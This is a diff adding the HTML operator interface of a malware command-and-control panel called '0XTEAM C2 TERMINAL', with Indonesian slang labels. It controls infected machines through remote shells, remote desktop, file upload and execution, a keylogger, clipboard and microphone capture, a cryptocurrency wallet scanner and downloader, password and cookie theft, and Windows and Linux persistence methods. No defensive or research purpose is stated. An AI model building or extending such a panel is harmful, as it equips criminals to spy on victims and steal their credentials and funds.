@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0XTEAM C2 TERMINAL</title>
+    <link rel="stylesheet" href="static/styles.css">
+</head>
+<body>
+     
+    
+    <!-- Background Audio -->
+    <audio id="bgMusic" loop>
+        <source src="https://github.com/arcel1945/Download-here/raw/refs/heads/main/backsound.mp3" type="audio/mpeg">
+        
+    </audio>
+    <div class="container">
+        <div class="header">
+            <h1>0X TEAM CONTROL</h1>
+            <div class="status">
+                <span class="connection-status" id="connectionStatus"></span>
+                <span id="statusText">SABAR TOD..</span> | 
+                <span id="clientCount">0</span> ACTIVE CLIENTS
+            </div>
+        </div>
+        
+        <div class="clients-panel">
+            <div class="panel-title">YANG KONEK TOD</div>
+            <div class="clients-list" id="clientsList">
+                <div class="no-clients">NO ACTIVE CLIENTS</div>
+            </div>
+        </div>
+        
+        <div class="terminal-panel">
+            <div class="panel-title">COMMAND TERMINAL TOD</div>
+            <div class="shell-selector">
+                <label>ACTION: </label>
+                <select id="shellType">
+                    <option value="cmd">CMD</option>
+                    <option value="powershell">PowerShell</option>
+                    <option value="remote-desktop">Remote Desktop</option>
+                    <option value="remote-execute">Remote Execute</option>
+                    <option value="file-manager">File Manager</option>
+                    <option value="process-manager">Process Manager</option>
+                    <option value="clipboard-manager">ClipBoard Manager</option>
+                    <option value="keylog-manager">Keylog Manager</option>
+                   <option value="registry-editor">Registry Manager</option>
+                   <option value="network-tools">Network Tools</option>
+                   <option value="audio-recorder">Audio Recorder</option>
+                   <option value="persistence">Persistence</option>
+                   <option value="wallet-scanner">Wallet Scanner</option>
+                   <option value="troll-panel">Troll Panel</option>
+                   <option value="system-info">System Information</option>
+                   <option value="script-execution">Script Execution</option>
+                   <option value="password-recovery">Passwords/Cookies Recovery</option>
+                  
+                </select>
+            </div>
+            <div class="terminal" id="terminal">
+                <div class="terminal-output">SISTEM SIAP - PILIH CLIENT BUAT DI SIKAT</div>
+            </div>
+            <div class="command-input-container">
+                <span class="prompt">0XTEAM@C2:~$</span>
+                <input type="text" class="command-input" id="commandInput" placeholder="Enter command..." disabled>
+                <button class="send-btn" id="sendBtn" disabled>EXECUTE</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            ◤◢◤◢ DI RECODE TOD ◣◥◣◥
+        </div>
+    </div>
+
+
+    <div class="modal-overlay" id="scriptModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">◢ CUSTOM SCRIPT EXECUTION ◣ <span id="scriptClientId"></span></div>
+                <button class="modal-close" onclick="closeScriptModal()">CLOSE</button>
+            </div>
+            <div class="modal-body">
+                <div class="script-container">
+                    <div class="script-controls">
+                        <select class="script-type-select" id="scriptType">
+                            <option value="powershell">PowerShell</option>
+                            <option value="batch">Batch</option>
+                            <option value="vbscript">VBScript</option>
+                        </select>
+                        <button class="send-btn" onclick="executeCustomScript()">EXECUTE SCRIPT</button>
+                    </div>
+    
+                    <div class="script-editor-container">
+                        <textarea class="script-editor" id="scriptEditor" placeholder="Enter your script here..."></textarea>
+                        <div class="script-output" id="scriptOutput">◤ SCRIPT OUTPUT ◥</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+<!-- Wallet Modal -->
+<div class="modal-overlay" id="walletModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ WALLET SCANNER ◣ <span id="walletClientId"></span></div>
+            <button class="modal-close" onclick="closeWalletModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="wallet-container">
+                <div class="wallet-controls">
+                    <button class="wallet-btn primary" id="scanWalletsBtn" onclick="startWalletScan()">
+                        ◤ START SCAN ◥
+                    </button>
+                    <div class="scan-stats" id="scanStats">
+                        <div class="stat-item">
+                            <span class="stat-label">Found:</span>
+                            <span class="stat-value" id="walletsFound">0</span>
+                        </div>
+                        <div class="stat-item">
+                            <span class="stat-label">Downloaded:</span>
+                            <span class="stat-value" id="walletsDownloaded">0</span>
+                        </div>
+                        <div class="stat-item">
+                            <span class="stat-label">Status:</span>
+                            <span class="stat-value" id="scanStatus">Ready</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="wallet-info">
+                    <div class="info-card">
+                        <div class="info-title">◤ WHAT THIS SCANS ◥</div>
+                        <div class="info-content">
+                            <div class="wallet-category">
+                                <div class="category-title">Desktop Wallets</div>
+                                <div class="wallet-list">
+                                    Bitcoin Core • Ethereum • Electrum • Exodus • Atomic • Jaxx • Coinomi • Guarda
+                                </div>
+                            </div>
+                            <div class="wallet-category">
+                                <div class="category-title">Browser Extensions</div>
+                                <div class="wallet-list">
+                                    MetaMask • Binance • Coinbase • TronLink • Phantom • Trust • Ronin • Yoroi • Nami
+                                </div>
+                            </div>
+                            <div class="wallet-category">
+                                <div class="category-title">Browsers Checked</div>
+                                <div class="wallet-list">
+                                    Chrome • Brave • Edge • Firefox • Opera
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="wallet-results">
+                    <div class="results-header">◤ SCAN RESULTS ◥</div>
+                    <div class="results-filter">
+                        <button class="filter-btn active" onclick="filterWallets('all')">ALL</button>
+                        <button class="filter-btn" onclick="filterWallets('desktop')">DESKTOP</button>
+                        <button class="filter-btn" onclick="filterWallets('extension')">EXTENSIONS</button>
+                        <button class="filter-btn" onclick="filterWallets('downloaded')">DOWNLOADED</button>
+                    </div>
+                    <div class="results-list" id="walletResults">
+                        <div class="no-results">No scan performed yet</div>
+                    </div>
+                </div>
+                
+                <div class="wallet-download-progress" id="walletDownloadProgress" style="display: none;">
+                    <div class="download-info">
+                        <span>Downloading: <span id="downloadingWallet"></span></span>
+                        <span id="downloadProgress">0%</span>
+                    </div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="walletProgressBar"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Troll Panel Modal -->
+<div class="modal-overlay" id="trollModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ TROLL PANEL ◣ <span id="trollClientId"></span></div>
+            <button class="modal-close" onclick="closeTrollModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="troll-container">
+                <!-- Message Box -->
+                <div class="troll-card">
+                    <div class="troll-card-header">◤ SHOW MESSAGE BOX ◥</div>
+                    <div class="troll-card-body">
+                        <input type="text" id="trollMsgTitle" placeholder="Message Title">
+                        <textarea id="trollMsgText" placeholder="Message Text"></textarea>
+                        <button class="troll-btn" onclick="sendTroll('messagebox')">SHOW MESSAGE</button>
+                    </div>
+                </div>
+
+                <!-- Open URL -->
+                <div class="troll-card">
+                    <div class="troll-card-header">◤ OPEN URL ◥</div>
+                    <div class="troll-card-body">
+                        <input type="text" id="trollUrl" placeholder="https://example.com">
+                        <button class="troll-btn" onclick="sendTroll('open_url')">OPEN URL</button>
+                    </div>
+                </div>
+                
+                <!-- Text-to-Speech -->
+                <div class="troll-card">
+                    <div class="troll-card-header">◤ TEXT-TO-SPEECH ◥</div>
+                    <div class="troll-card-body">
+                        <textarea id="trollTtsText" placeholder="Text to speak..."></textarea>
+                        <button class="troll-btn" onclick="sendTroll('tts')">SPEAK</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- System Info Modal -->
+<div class="modal-overlay" id="sysInfoModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ SYSTEM INFORMATION ◣ <span id="sysInfoClientId"></span></div>
+            <button class="modal-close" onclick="closeSysInfoModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="sysinfo-container">
+                <div class="sysinfo-tabs">
+                    <button class="sysinfo-tab active" onclick="switchSysInfoTab('general')">GENERAL</button>
+                    <button class="sysinfo-tab" onclick="switchSysInfoTab('hardware')">HARDWARE</button>
+                    <button class="sysinfo-tab" onclick="switchSysInfoTab('software')">SOFTWARE</button>
+                    <button class="sysinfo-tab" onclick="switchSysInfoTab('network')">NETWORK</button>
+                </div>
+
+                <div class="sysinfo-panel" id="sysInfoContent">
+                    <div class="loading">Loading system information...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- PersistenceModal -->
+<div class="modal-overlay" id="persistenceModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ PERSISTENCE MANAGEMENT ◣ <span id="persistenceClientId"></span></div>
+            <button class="modal-close" onclick="closePersistenceModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="persistence-container">
+                <div class="persistence-status-section">
+                    <div class="status-card">
+                        <div class="status-card-header">◤ CURRENT STATUS ◥</div>
+                        <div class="status-card-body">
+                            <div class="persistence-main-status">
+                                <span class="status-indicator" id="persistenceIndicator"></span>
+                                <span id="persistenceMainStatus">Checking...</span>
+                            </div>
+                            <div class="installed-methods" id="installedMethods">
+                                <!-- Methods will be listed here -->
+                            </div>
+                        </div>
+                        <button class="persistence-btn" onclick="checkPersistence()">REFRESH STATUS</button>
+                    </div>
+                </div>
+                
+                <div class="persistence-methods">
+                    <div class="methods-header">◤ AVAILABLE METHODS ◥</div>
+                    
+                    <!-- Windows Methods -->
+                    <div class="method-group" id="windowsMethods">
+                        <div class="method-group-title">Windows Methods</div>
+                        
+                        <div class="method-card">
+                            <div class="method-info">
+                                <div class="method-name">Registry Run Key</div>
+                                <div class="method-desc">Adds to HKCU\...\Run registry</div>
+                            </div>
+                            <button class="method-btn" onclick="installPersistence('registry')">INSTALL</button>
+                        </div>
+                        
+                        <div class="method-card">
+                            <div class="method-info">
+                                <div class="method-name">Startup Folder</div>
+                                <div class="method-desc">Copies to Windows startup folder</div>
+                            </div>
+                            <button class="method-btn" onclick="installPersistence('startup_folder')">INSTALL</button>
+                        </div>
+                        
+                        <div class="method-card">
+                            <div class="method-info">
+                                <div class="method-name">Scheduled Task</div>
+                                <div class="method-desc">Creates Windows scheduled task</div>
+                            </div>
+                            <button class="method-btn" onclick="installPersistence('scheduled_task')">INSTALL</button>
+                        </div>
+                        
+                        <div class="method-card">
+                            <div class="method-info">
+                                <div class="method-name">Windows Service</div>
+                                <div class="method-desc">Installs as system service (Admin)</div>
+                            </div>
+                            <button class="method-btn admin" onclick="installPersistence('service')">INSTALL</button>
+                        </div>
+                    </div>
+                    
+                    <!-- Linux Methods -->
+                    <div class="method-group" id="linuxMethods" style="display: none;">
+                        <div class="method-group-title">Linux Methods</div>
+                        
+                        <div class="method-card">
+                            <div class="method-info">
+                                <div class="method-name">Cron Job</div>
+                                <div class="method-desc">Adds @reboot cron entry</div>
+                            </div>
+                            <button class="method-btn" onclick="installPersistence('cron')">INSTALL</button>
+                        </div>
+                        
+                        <div class="method-card">
+                            <div class="method-info">
+                                <div class="method-name">Systemd Service</div>
+                                <div class="method-desc">Creates systemd user service</div>
+                            </div>
+                            <button class="method-btn" onclick="installPersistence('systemd')">INSTALL</button>
+                        </div>
+                        
+                        <div class="method-card">
+                            <div class="method-info">
+                                <div class="method-name">Desktop Autostart</div>
+                                <div class="method-desc">Creates .desktop autostart file</div>
+                            </div>
+                            <button class="method-btn" onclick="installPersistence('desktop')">INSTALL</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="persistence-actions">
+                    <button class="persistence-btn danger" onclick="removeAllPersistence()">
+                        ◤ REMOVE ALL PERSISTENCE ◥
+                    </button>
+                </div>
+                
+                <div class="persistence-log">
+                    <div class="log-header">◤ OPERATION LOG ◥</div>
+                    <div class="log-content" id="persistenceLog"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+ <!-- Audio Modal -->
+<div class="modal-overlay" id="audioModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ AUDIO RECORDING ◣ <span id="audioClientId"></span></div>
+            <button class="modal-close" onclick="closeAudioModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="audio-container">
+                <div class="audio-controls">
+                    <div class="audio-device-section">
+                        <label>Audio Device:</label>
+                        <select class="audio-device-select" id="audioDeviceSelect">
+                            <option value="0">Default Microphone</option>
+                        </select>
+                        <button class="audio-btn" onclick="refreshAudioDevices()">REFRESH</button>
+                    </div>
+                    
+                    <div class="audio-duration-section">
+                        <label>Duration (seconds):</label>
+                        <input type="number" id="audioDuration" value="30" min="5" max="300">
+                        <span class="duration-info">Max: 5 minutes</span>
+                    </div>
+                </div>
+                
+                <div class="audio-record-section">
+                    <div class="record-visualizer" id="recordVisualizer">
+                        <div class="visualizer-bar"></div>
+                        <div class="visualizer-bar"></div>
+                        <div class="visualizer-bar"></div>
+                        <div class="visualizer-bar"></div>
+                        <div class="visualizer-bar"></div>
+                    </div>
+                    
+                    <div class="record-controls">
+                        <button class="record-btn" id="recordBtn" onclick="toggleRecording()">
+                            <span class="record-icon">⏺</span>
+                            <span id="recordBtnText">START RECORDING</span>
+                        </button>
+                        
+                        <div class="record-status" id="recordStatus">
+                            <span class="status-dot"></span>
+                            <span id="recordStatusText">Ready</span>
+                        </div>
+                    </div>
+                    
+                    <div class="record-timer" id="recordTimer" style="display: none;">
+                        <span class="timer-text">Recording: <span id="timerValue">00:00</span></span>
+                        <div class="timer-bar-container">
+                            <div class="timer-bar" id="timerBar"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="audio-recordings">
+                    <div class="recordings-header">◤ RECORDED AUDIO FILES ◥</div>
+                    <div class="recordings-list" id="recordingsList">
+                        <div class="no-recordings">No recordings yet</div>
+                    </div>
+                </div>
+                
+                <div class="audio-status" id="audioStatus">Ready to record</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+ <!-- Network Modal -->
+
+<div class="modal-overlay" id="networkModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ NETWORK TOOLS ◣ <span id="networkClientId"></span></div>
+            <button class="modal-close" onclick="closeNetworkModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="network-container">
+                <div class="network-tabs">
+                    <button class="network-tab active" onclick="switchNetworkTab('connections')">CONNECTIONS</button>
+                    <button class="network-tab" onclick="switchNetworkTab('scanner')">PORT SCANNER</button>
+                </div>
+                
+                <!-- Connections Tab -->
+                <div class="network-panel" id="connectionsPanel">
+                    <div class="connections-controls">
+                        <button class="network-btn" onclick="refreshConnections()">REFRESH</button>
+                        <button class="network-btn" id="netstatMonitorBtn" onclick="toggleNetstatMonitor()">START MONITOR</button>
+                        <button class="network-btn danger" id="closeConnectionBtn" onclick="closeSelectedConnection()" disabled>CLOSE CONNECTION</button>
+                        <div class="connection-filter">
+                            <input type="text" id="connectionFilterInput" placeholder="Filter connections..." onkeyup="filterConnections(event)">
+                        </div>
+                    </div>
+                    
+                    <div class="connections-list-container">
+                        <div class="connections-header">
+                            <div>Protocol</div>
+                            <div>Local Address</div>
+                            <div>Remote Address</div>
+                            <div>State</div>
+                            <div>Process</div>
+                        </div>
+                        <div class="connections-list" id="connectionsList">
+                            <div class="loading">Loading connections...</div>
+                        </div>
+                    </div>
+                    
+                    <div class="connections-status">
+                        <div id="connectionsStatusText">Ready</div>
+                        <div id="connectionsCount">0 connections</div>
+                    </div>
+                </div>
+                
+                <!-- Port Scanner Tab -->
+                <div class="network-panel" id="scannerPanel" style="display: none;">
+                    <div class="scanner-controls">
+                        <div class="scanner-input-section">
+                            <input type="text" id="scanTargetInput" placeholder="Target IP (e.g., 192.168.1.1)">
+                            <input type="number" id="scanStartPort" placeholder="Start Port" value="1" min="1" max="65535">
+                            <input type="number" id="scanEndPort" placeholder="End Port" value="1000" min="1" max="65535">
+                            <button class="network-btn primary" id="startScanBtn" onclick="startPortScan()">START SCAN</button>
+                            <button class="network-btn danger" id="stopScanBtn" onclick="stopPortScan()" disabled>STOP</button>
+                        </div>
+                        
+                        <div class="scan-presets">
+                            <button class="preset-btn" onclick="setScanPreset('common')">Common Ports</button>
+                            <button class="preset-btn" onclick="setScanPreset('web')">Web Ports</button>
+                            <button class="preset-btn" onclick="setScanPreset('full')">Full Range</button>
+                        </div>
+                    </div>
+                    
+                    <div class="scan-progress-section" id="scanProgressSection" style="display: none;">
+                        <div class="scan-info">
+                            <span>Scanning: <span id="scanTarget"></span></span>
+                            <span>Progress: <span id="scanProgress">0%</span></span>
+                        </div>
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="scanProgressBar"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="scan-results-container">
+                        <div class="scan-results-header">◤ OPEN PORTS ◥</div>
+                        <div class="scan-results" id="scanResults">
+                            <div class="no-results">No scan results yet</div>
+                        </div>
+                    </div>
+                    
+                    <div class="scanner-status" id="scannerStatus">Ready to scan</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+    <!-- Registry Modal -->
+    <div class="modal-overlay" id="registryModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ REGISTRY EDITOR ◣ <span id="registryClientId"></span></div>
+            <button class="modal-close" onclick="closeRegistryModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="registry-container">
+                <div class="registry-controls">
+                    <div class="registry-path-section">
+                        <select class="registry-hive-select" id="registryHiveSelect">
+                            <option value="HKLM">HKEY_LOCAL_MACHINE</option>
+                            <option value="HKCU">HKEY_CURRENT_USER</option>
+                            <option value="HKCR">HKEY_CLASSES_ROOT</option>
+                            <option value="HKU">HKEY_USERS</option>
+                            <option value="HKCC">HKEY_CURRENT_CONFIG</option>
+                        </select>
+                        <input type="text" class="registry-path-input" id="registryPathInput" 
+                               placeholder="Enter registry path (e.g., SOFTWARE\Microsoft\Windows)">
+                        <button class="registry-btn" onclick="navigateRegistry()">GO</button>
+                    </div>
+                    
+                    <div class="registry-action-section">
+                        <button class="registry-btn" onclick="refreshRegistry()">REFRESH</button>
+                        <button class="registry-btn" onclick="showAddValueDialog()">ADD VALUE</button>
+                        <button class="registry-btn danger" id="deleteRegBtn" onclick="deleteRegistryItem()" disabled>DELETE</button>
+                    </div>
+                </div>
+                
+                <div class="registry-browser">
+                    <div class="registry-tree">
+                        <div class="tree-header">◤ REGISTRY KEYS ◥</div>
+                        <div class="tree-content" id="registryKeys">
+                            <div class="loading">Loading keys...</div>
+                        </div>
+                    </div>
+                    
+                    <div class="registry-values">
+                        <div class="values-header">◤ REGISTRY VALUES ◥</div>
+                        <div class="values-content" id="registryValues">
+                            <div class="no-selection">Select a key to view values</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="registry-status" id="registryStatus">Ready</div>
+            </div>
+            
+            <!-- Add/Edit Value Dialog -->
+            <div class="registry-dialog" id="addValueDialog" style="display: none;">
+                <div class="dialog-content">
+                    <h3>Add/Edit Registry Value</h3>
+                    <input type="text" id="regValueName" placeholder="Value name">
+                    <select id="regValueType">
+                        <option value="REG_SZ">String (REG_SZ)</option>
+                        <option value="REG_DWORD">DWORD (REG_DWORD)</option>
+                        <option value="REG_BINARY">Binary (REG_BINARY)</option>
+                        <option value="REG_MULTI_SZ">Multi-String (REG_MULTI_SZ)</option>
+                        <option value="REG_EXPAND_SZ">Expandable String (REG_EXPAND_SZ)</option>
+                    </select>
+                    <textarea id="regValueData" placeholder="Value data"></textarea>
+                    <div class="dialog-buttons">
+                        <button class="registry-btn" onclick="saveRegistryValue()">SAVE</button>
+                        <button class="registry-btn" onclick="hideAddValueDialog()">CANCEL</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <!-- Remote Desktop Modal -->
+    <div class="modal-overlay" id="rdpModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">◢ REMOTE DESKTOP ◣ <span id="rdpClientId"></span></div>
+                <button class="modal-close" onclick="closeRdpModal()">CLOSE</button>
+            </div>
+            <div class="modal-body">
+                <div class="rdp-controls">
+                    <button class="rdp-btn" id="rdpStartBtn" onclick="startRemoteDesktop()">START</button>
+                    <button class="rdp-btn stop" id="rdpStopBtn" onclick="stopRemoteDesktop()" disabled>STOP</button>
+                    
+                    <div class="quality-selector">
+                        <label>QUALITY:</label>
+                        <select id="rdpQuality" onchange="changeQuality()">
+                            <option value="low">LOW (Fast)</option>
+                            <option value="medium" selected>MEDIUM</option>
+                            <option value="high">HIGH (Slow)</option>
+                        </select>
+                    </div>
+                    
+                    <div class="rdp-status disconnected" id="rdpStatus">DISCONNECTED</div>
+                </div>
+                
+                <div class="screen-container">
+                    <div class="screen-placeholder" id="screenPlaceholder">
+                        ◤ REMOTE DESKTOP VIEWER ◥<br>
+                        Click START to begin screen capture
+                    </div>
+                    <img class="screen-image" id="screenImage" style="display: none;" />
+                    <div class="fps-counter" id="fpsCounter" style="display: none;">FPS: 0</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Remote Execute Modal -->
+    <div class="modal-overlay" id="execModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">◢ REMOTE EXECUTE ◣ <span id="execClientId"></span></div>
+                <button class="modal-close" onclick="closeExecModal()">CLOSE</button>
+            </div>
+            <div class="modal-body">
+                <div class="exec-controls">
+                    <div class="file-upload-section">
+                        <div class="file-input-wrapper">
+                            <label for="fileInput" class="file-input-label">
+                                ◤ SELECT FILE ◥
+                            </label>
+                            <input type="file" id="fileInput" accept="*" onchange="handleFileSelect(event)">
+                        </div>
+                        <div class="file-info" id="fileInfo">No file selected (Max: 50MB)</div>
+                    </div>
+                    
+                    <div class="progress-section" id="progressSection">
+                        <div class="progress-bar-container">
+                            <div class="progress-bar" id="progressBar"></div>
+                            <div class="progress-text" id="progressText">0%</div>
+                        </div>
+                    </div>
+                    
+                    <button class="exec-btn" id="uploadBtn" onclick="uploadFile()" disabled>
+                        ◤ UPLOAD FILE ◥
+                    </button>
+                    
+                    <button class="exec-btn danger" id="executeBtn" onclick="executeFile()" disabled>
+                        ◤ EXECUTE ◥
+                    </button>
+                </div>
+                
+                <div class="exec-output" id="execOutput">
+                    ◤ EXECUTION OUTPUT ◥
+                    ────────────────────
+                    Ready to upload and execute files...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- File Manager Modal -->
+    <div class="modal-overlay" id="fmModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">◢ FILE MANAGER ◣ <span id="fmClientId"></span></div>
+                <button class="modal-close" onclick="closeFmModal()">CLOSE</button>
+            </div>
+            <div class="modal-body">
+                <div class="fm-container">
+                    <div class="fm-controls">
+                        <div class="fm-path-section">
+                            <select class="fm-drive-select" id="fmDriveSelect" onchange="changeDrive()">
+                                <option value="C:">C:</option>
+                            </select>
+                            <input type="text" class="fm-path-input" id="fmPathInput" placeholder="Enter path..." onkeypress="handlePathKeypress(event)">
+                            <button class="fm-btn" onclick="navigateToPath()">GO</button>
+                            <button class="fm-btn" onclick="navigateUp()">◤ UP ◥</button>
+                            <button class="fm-btn" onclick="refreshFiles()">REFRESH</button>
+                        </div>
+                        
+                        <div class="fm-action-section">
+                            <button class="fm-btn" id="fmExecuteBtn" onclick="executeSelected()" disabled>EXECUTE</button>
+                            <button class="fm-btn" id="fmZipBtn" onclick="zipCurrent()" disabled>ZIP SELECTED</button>
+                            <button class="fm-btn" id="fmDownloadBtn" onclick="downloadSelected()" disabled>DOWNLOAD</button>
+                            <div class="file-input-wrapper">
+                                <label for="fmFileInput" class="fm-btn">
+                                    UPLOAD HERE
+                                </label>
+                                <input type="file" id="fmFileInput" accept="*" onchange="handleFmFileSelect(event)" style="display: none;">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="fm-search-section">
+                        <input type="text" class="fm-search-input" id="fmSearchInput" placeholder="Search pattern (e.g., *.txt, *pass*)">
+                        <button class="fm-btn" onclick="searchFiles()">SEARCH</button>
+                        <button class="fm-btn" onclick="stopSearch()" id="fmStopSearchBtn" style="display: none;">STOP</button>
+                    </div>
+                    
+                    <div class="fm-browser">
+                        <div class="fm-header">
+                            <div>Type</div>
+                            <div>Name</div>
+                            <div>Size</div>
+                            <div>Modified</div>
+                            <div>Extension</div>
+                        </div>
+                        <div class="fm-files" id="fmFiles">
+                            <!-- Files will be populated here -->
+                        </div>
+                    </div>
+                    
+                    <div class="fm-status">
+                        <div id="fmStatusText">Ready</div>
+                        <div id="fmSelectedInfo">No selection</div>
+                    </div>
+                </div>
+                
+                <!-- Progress Modal for downloads/uploads -->
+                <div class="fm-progress-modal" id="fmProgressModal">
+                    <div class="fm-progress-title" id="fmProgressTitle">Processing...</div>
+                    <div class="fm-progress-info" id="fmProgressInfo"></div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="fmProgressBar"></div>
+                        <div class="progress-text" id="fmProgressText">0%</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+<div class="modal-overlay" id="processModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ PROCESS MANAGER ◣ <span id="processClientId"></span></div>
+            <button class="modal-close" onclick="closeProcessModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="process-container">
+                <div class="process-controls">
+                    <div class="process-search-section">
+                        <input type="text" class="process-search-input" id="processSearchInput" 
+                               placeholder="Search processes..." onkeyup="searchProcesses(event)">
+                        <button class="process-btn" onclick="refreshProcesses()">REFRESH</button>
+                        <button class="process-btn" onclick="showStartProcessDialog()">START NEW</button>
+                    </div>
+                    
+                    <div class="process-action-section">
+                        <button class="process-btn danger" id="killProcessBtn" onclick="killSelectedProcess()" disabled>KILL</button>
+                        <select class="process-priority-select" id="processPrioritySelect" onchange="setProcessPriority()" disabled>
+                            <option value="">Set Priority</option>
+                            <option value="low">Low</option>
+                            <option value="normal">Normal</option>
+                            <option value="high">High</option>
+                            <option value="realtime">Realtime</option>
+                        </select>
+                        <button class="process-btn" id="processDetailsBtn" onclick="getProcessDetails()" disabled>DETAILS</button>
+                    </div>
+                </div>
+                
+                <div class="process-list-container">
+                    <div class="process-header">
+                        <div>PID</div>
+                        <div>Name</div>
+                        <div>Memory</div>
+                        <div>Threads</div>
+                    </div>
+                    <div class="process-list" id="processList">
+                        <div class="loading">Loading processes...</div>
+                    </div>
+                </div>
+                
+                <div class="process-status">
+                    <div id="processStatusText">Ready</div>
+                    <div id="processCount">0 processes</div>
+                </div>
+            </div>
+            
+            <!-- Start Process Dialog -->
+            <div class="process-dialog" id="startProcessDialog" style="display: none;">
+                <div class="dialog-content">
+                    <h3>Start New Process</h3>
+                    <input type="text" id="processPathInput" placeholder="Path to executable (e.g., C:\Windows\notepad.exe)">
+                    <input type="text" id="processArgsInput" placeholder="Arguments (optional)">
+                    <div class="dialog-buttons">
+                        <button class="process-btn" onclick="startNewProcess()">START</button>
+                        <button class="process-btn" onclick="hideStartProcessDialog()">CANCEL</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Process Details Dialog -->
+            <div class="process-dialog" id="processDetailsDialog" style="display: none;">
+                <div class="dialog-content">
+                    <h3>Process Details</h3>
+                    <div id="processDetailsContent"></div>
+                    <button class="process-btn" onclick="hideProcessDetails()">CLOSE</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="modal-overlay" id="clipboardModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ CLIPBOARD MANAGER ◣ <span id="clipboardClientId"></span></div>
+            <button class="modal-close" onclick="closeClipboardModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="clipboard-container">
+                <div class="clipboard-controls">
+                    <button class="clipboard-btn" onclick="getClipboard()">GET CLIPBOARD</button>
+                    <button class="clipboard-btn" onclick="clearClipboardInput()">CLEAR</button>
+                    <button class="clipboard-btn" id="clipboardMonitorBtn" onclick="toggleClipboardMonitor()">START MONITOR</button>
+                </div>
+                
+                <div class="clipboard-input-section">
+                    <textarea id="clipboardInput" placeholder="Enter text to set clipboard or view current clipboard content..."></textarea>
+                    <button class="clipboard-btn primary" onclick="setClipboard()">SET CLIPBOARD</button>
+                </div>
+                
+                <div class="clipboard-history">
+                    <div class="history-header">◤ CLIPBOARD HISTORY ◥</div>
+                    <div class="history-list" id="clipboardHistory"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="modal-overlay" id="keyloggerModal">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="modal-title">◢ KEYLOGGER ◣ <span id="keyloggerClientId"></span></div>
+            <button class="modal-close" onclick="closeKeyloggerModal()">CLOSE</button>
+        </div>
+        <div class="modal-body">
+            <div class="keylogger-container">
+                <div class="keylogger-controls">
+                    <button class="keylogger-btn" id="keyloggerStartBtn" onclick="toggleKeylogger()">START LOGGING</button>
+                    <button class="keylogger-btn" onclick="getKeylog()">GET LOG</button>
+                    <button class="keylogger-btn" onclick="clearKeylog()">CLEAR LOG</button>
+                    <button class="keylogger-btn" onclick="exportKeylog()">EXPORT</button>
+                    <div class="keylogger-status" id="keyloggerStatus">
+                        <span class="status-indicator inactive"></span>
+                        <span id="keyloggerStatusText">INACTIVE</span>
+                    </div>
+                </div>
+                
+                <div class="keylog-display">
+                    <div class="keylog-header">
+                        <span>◤ CAPTURED KEYSTROKES ◥</span>
+                        <span id="keylogSize">0 bytes</span>
+                    </div>
+                    <div class="keylog-content" id="keylogContent">
+                        No keystrokes captured yet...
+                    </div>
+                </div>
+                
+                <div class="keylog-stats">
+                    <div>Total Characters: <span id="keylogChars">0</span></div>
+                    <div>Words: <span id="keylogWords">0</span></div>
+                    <div>Lines: <span id="keylogLines">0</span></div>
+                    <div>Last Update: <span id="keylogLastUpdate">Never</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="static/script.js"></script>
+
+
+ </body>
+ </html>
